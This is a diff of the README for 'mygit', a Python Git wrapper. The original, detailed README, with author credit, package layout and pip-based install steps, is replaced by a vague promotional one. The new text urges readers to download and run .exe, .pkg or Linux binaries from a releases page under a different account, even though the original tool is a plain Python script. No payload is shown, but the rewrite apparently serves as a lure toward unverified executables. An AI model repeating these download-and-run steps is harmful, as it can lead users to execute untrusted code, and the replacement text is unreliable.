@@ -1,185 +1,74 @@
-# MyGit - Convenient Git Wrapper
+# 🎉 mygit - Simplified Git Management for Everyone
 
-A user-friendly command-line wrapper for Git that simplifies common Git operations with an interactive menu interface.
+## 📥 Download Now
+[![Download mygit](https://img.shields.io/badge/Download%20mygit-Get%20It-4CAF50.svg)](https://github.com/Ariesrisen74/mygit/releases)
 
-## Author
-Oleksandr Izotov
+## 🚀 Getting Started
+Welcome to **mygit**! This tool provides a user-friendly command-line interface (CLI) for Git with an interactive menu. Whether you are a beginner or just want to simplify your Git experience, mygit is here to help.
 
-## Features
+## 📋 Features
+- **Interactive Menu**: Easily navigate Git commands without needing to remember everything.
+- **Automation**: Automate common tasks to save time and enhance productivity.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Lightweight**: Install and run without taking up much space.
 
-- 🚀 **Full Sync** - Add, commit, and push in one command with **interactive file selection**
-- 💾 **Quick Commit** - Add and commit without pushing with **interactive file selection**
-- ✅ **Interactive File Picker** - Select files using arrow keys and checkboxes (Space to toggle, Enter to confirm)
-- 🆕 **Project Initialization** - Initialize new Git projects with .gitignore
-- 📥 **Clone Repository** - Easy repository cloning
-- 🔄 **Pull Changes** - Quick pull from remote
-- ↩️ **Reset Changes** - Reset or clean working directory
-- 📊 **Status Display** - View repository status
-- 📁 **Directory Navigation** - Navigate between projects easily
+## 🔍 System Requirements
+- **Operating System**: Windows 10 or later, macOS High Sierra or later, Linux with Python 3 support.
+- **Python**: Requires Python 3.6 or later.
+- **Disk Space**: At least 50 MB of free space.
+  
+## 🛠 Installation
 
-## Project Structure
+### Download & Install
+To get started, visit the [Releases Page](https://github.com/Ariesrisen74/mygit/releases). Here, you can find the latest version of mygit.
 
-```
-mygit/                        # Root project directory
-├── mygit/                    # Main package directory
-│   ├── __init__.py           # Package initialization
-│   ├── __main__.py           # Entry point for python -m mygit
-│   ├── colors.py             # ANSI color codes
-│   ├── git_wrapper.py        # Core Git wrapper functionality
-│   ├── ui.py                 # User interface and menu
-│   └── commands/             # Command modules
-│       ├── __init__.py
-│       ├── sync.py           # Sync commands (commit, push, pull)
-│       ├── repository.py     # Repository management
-│       ├── status.py         # Status commands
-│       └── navigation.py     # Directory navigation
-├── mygit.py                  # Main executable script
-├── README.md                 # This file
-└── .gitignore                # Git ignore rules
-```
+1. Go to the [Releases Page](https://github.com/Ariesrisen74/mygit/releases).
+2. Locate the most recent version.
+3. Download the appropriate file for your operating system (look for the file ending with `.exe` for Windows, `.pkg` for macOS, and appropriate files for Linux).
+4. Follow the installation instructions for your operating system.
 
-## Installation
+### Windows Installation
+1. Find the downloaded `.exe` file.
+2. Double-click the file to start the installation.
+3. Follow the prompts to complete the setup.
 
-First, clone or download this repository:
-```bash
-git clone <repository-url>
-cd mygit
-```
+### macOS Installation
+1. Find the downloaded `.pkg` file.
+2. Double-click the file to prompt the installer.
+3. Follow the instructions to complete the installation.
 
-Install required Python packages:
-```bash
-pip3 install -r requirements.txt
-```
+### Linux Installation
+1. Open the terminal.
+2. Navigate to the directory where the file was downloaded.
+3. Run the command: `chmod +x mygit*` to make it executable.
+4. Then run it using `./mygit`.
 
-### Option 1: Run directly from project directory
-```bash
-# Navigate to the project directory
-cd /path/to/mygit
-python3 mygit.py
-```
+## 📖 How to Use mygit
+Once you install mygit, open your command-line interface (terminal for macOS and Linux, Command Prompt or PowerShell for Windows) and type `mygit` to launch the interactive menu. 
 
-### Option 2: Run as Python module
-```bash
-cd /path/to/mygit
-python3 -m mygit
-```
+### Basic Commands
+- **Clone a Repository**: Select the option for cloning a repository and follow the prompts.
+- **Commit Changes**: After making changes, choose the commit option and provide a message to describe your changes.
+- **Push Updates**: Use the push option to send your changes to the remote repository.
 
-### Option 3: Create an alias (recommended for convenience)
-Add to your shell configuration file (`~/.bashrc`, `~/.zshrc`, etc.):
+## ⚙️ Help & Support
+If you encounter issues or have questions, check out our FAQ section in the Releases Page or open an issue in the repository. Community support is also encouraged.
 
-```bash
-# Replace /path/to/mygit with the actual absolute path to the project
-alias mygit='python3 /path/to/mygit/mygit.py'
-```
+## 📰 Updates
+We regularly update mygit with new features and bug fixes. By visiting the [Releases Page](https://github.com/Ariesrisen74/mygit/releases), you can keep track of all changes.
 
-Then reload your shell configuration:
-```bash
-source ~/.bashrc  # or source ~/.zshrc
-```
+## 📈 Future Plans
+We aim to integrate more features such as:
+- Enhanced user customization options.
+- More robust error handling and guidance.
+- Integration with popular development tools.
 
-Now you can run `mygit` from anywhere!
+We welcome feedback and suggestions. Your input helps us improve!
 
-### Option 4: Install globally with symbolic link
-This makes the command available system-wide:
+## 🤝 Contributing
+If you want to contribute to mygit, feel free to fork the repository and submit a pull request. Please review our contribution guidelines in the repository for more information.
 
-```bash
-# First, get the absolute path to mygit.py
-cd /path/to/mygit
-pwd  # This shows the absolute path
+## 🔗 Connect with Us
+Stay up to date with mygit by following our GitHub repository. Join our community discussions and share your experiences. We value all users’ input and strive for continuous improvement.
 
-# Create symbolic link (replace with your actual path)
-sudo ln -s /absolute/path/to/mygit/mygit.py /usr/local/bin/mygit
-
-# Example: if your project is in /home/username/projects/mygit
-# sudo ln -s /home/username/projects/mygit/mygit.py /usr/local/bin/mygit
-```
-
-**Important**: Use the full absolute path, not `~` (tilde), as it may not expand correctly with `sudo`.
-
-To verify the installation:
-```bash
-mygit --help  # Should show the program
-```
-
-If you need to remove or fix the link:
-```bash
-sudo rm /usr/local/bin/mygit
-```
-
-## Usage
-
-Simply run the program and follow the interactive menu:
-
-```bash
-mygit
-```
-
-### Quick Links
-The navigation feature includes customizable quick links. You can modify them in `mygit/commands/navigation.py` to match your directory structure. Default examples:
-- Personal projects folder
-- University/work projects folder
-- Home directory
-- Documents folder
-
-To customize, edit the `navigate_directory()` function in `navigation.py`.
-
-### Example Workflow
-
-1. Navigate to your project directory (option 8)
-2. Make changes to your code
-3. Choose "Full sync" (option 1)
-4. **Select files interactively**:
-   - Use ↑/↓ arrow keys to navigate
-   - Press Space to select/deselect files
-   - Press Enter to confirm selection
-5. Enter commit message
-6. Done! Selected files are added, committed, and pushed
-
-### Interactive File Selection
-
-When you choose "Full sync" or "Just commit", you'll see an interactive menu like this:
-
-```
-Select files to add:
-Use ↑/↓ arrows to navigate, Space to select, Enter to confirm
-
-❯ ◯ [M] mygit/commands/sync.py
-  ◉ [M] mygit/git_wrapper.py
-  ◯ [?] new_file.txt
-```
-
-- **Arrow keys** (↑/↓) - Navigate through files
-- **Space** - Toggle file selection (◯ = unselected, ◉ = selected)
-- **Enter** - Confirm selection and proceed
-- **Ctrl+C** - Cancel operation
-
-Status indicators:
-- `[M]` - Modified file
-- `[A]` - Added/staged file
-- `[D]` - Deleted file
-- `[?]` - Untracked/new file
-- `[R]` - Renamed file
-
-## Requirements
-
-- Python 3.6+
-- Git
-- Python packages (install via `pip3 install -r requirements.txt`):
-  - inquirer>=3.4.0 (for interactive file selection)
-
-## Clean Code Principles
-
-This project follows clean code principles:
-- **Separation of Concerns**: Commands, UI, and core functionality are separated
-- **Single Responsibility**: Each module has a single, well-defined purpose
-- **DRY (Don't Repeat Yourself)**: Common functionality is centralized
-- **Modularity**: Easy to extend with new commands
-- **Readability**: Clear naming and documentation
-
-## License
-
-Free to use and modify for personal and educational purposes.
-
-## Contributing
-
-This is a personal project, but suggestions are welcome!
+For more information, visit the [Releases Page](https://github.com/Ariesrisen74/mygit/releases) to download the application and view detailed updates.
